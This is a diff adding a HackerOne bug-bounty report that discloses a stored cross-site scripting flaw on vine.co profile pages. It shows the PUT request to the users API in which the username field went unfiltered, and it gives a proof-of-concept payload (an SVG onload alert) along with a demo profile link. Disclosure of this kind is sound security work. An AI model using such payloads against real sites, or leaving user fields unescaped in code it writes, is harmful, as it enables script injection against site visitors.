@@ -1,0 +1,18 @@
+# HackerOne Report: [Stored XSS] vine.co - profile page
+**Report ID:** 36986
+**Vulnerability Class:** Cross-site Scripting (XSS) - Generic
+
+## Vulnerability Information & PoC
+Stored XSS via API request:
+While creating new account in Windows mobile app, i noticed this request:
+
+    PUT /users/1147563919679037440 HTTP/1.1
+
+    avatarUrl=https%3A%2F%2Fvines.s3.amazonaws.com%2Favatars_trellis%2F2014%2F11%2F21%2F0B2EAE2EB81147563929149554688_1.3.4.jpg&username=
+
+it seems that the variable username is not properly filtered, just set username to e.g. <svg/onload=alert()> and see result on your profile in vine web site. 
+
+"demo":
+https://vine.co/u/1147563919679037440
+
+## Discussion & Remediation Timeline
